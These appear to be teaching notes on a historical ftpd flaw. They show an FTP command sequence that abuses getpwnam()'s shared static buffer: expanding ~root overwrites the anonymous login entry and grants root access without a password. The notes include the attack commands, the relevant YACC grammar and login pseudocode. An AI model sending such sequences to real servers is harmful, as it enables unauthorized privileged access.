### FTP Attack
Consider the following command sequence:
```
USER anonymous # set anonlymous login flag, retrieve anonymous entry from /etc/passwd
CWD ˜root
PASS anything
```
The trick: the `legal sequence` is:
```
USER
PASS
session commands
```
`ftpd` grammar treats all commands the same, including `USER` and `PASS`.

A closer look at the Actual YACC Grammar:
```
cmd : USER SP username CRLF
| PASS SP password CRLF
| CWD check_login SP pathname CRLF # pseudo-rule, just a hook for some C code that checks the logged in flag
| ...
```
How to find pathname?
```
pathname : STRING
= {
if ($1 && strncmp((char *) $1, "˜", 1) == 0) {
    $$ = (int)*glob((char *) $1);
    if (globerr != NULL) {
        reply(550, globerr);
        $$ = NULL;
    }
    free((char *) $1);
} else
    $$ = $1;
}
;
```
* The program is executed only if the grammar rule is matched.
* If the first character is `~`, it tries to do home directory expansion $$\rightarrow$$ replaces `~smb` with `/home/smb`.
* `glob()` looks up `smb's` record in `/etc/passwd` $$\rightarrow$$ two different routines are retrieving `/etc/passwd` entries.

#### Retrieve `/etc/passwd` twice..
> Programmer forgot the semantics of `getpwnam()`

* Processing `USER ananymous` $$\iff$$ `getpwnam("anonymous");`.
* Processing `~root` $$\iff$$ `getpwnam("root");`
* `~root` overwrites the buffer used by `USER ananymous`.
* Code sequence:

    ```
    pw = getpwnam("anonymous");
    if (user == "anonymous") guest = 1;
    ...
    globpw = getpwnam("root");
    ...
    if (!guest) { check password }
    chdir(pw->pw_dir);
    if (guest) chroot(pw->pw_dir);
    setuid(pw->pw_uid);
    ```
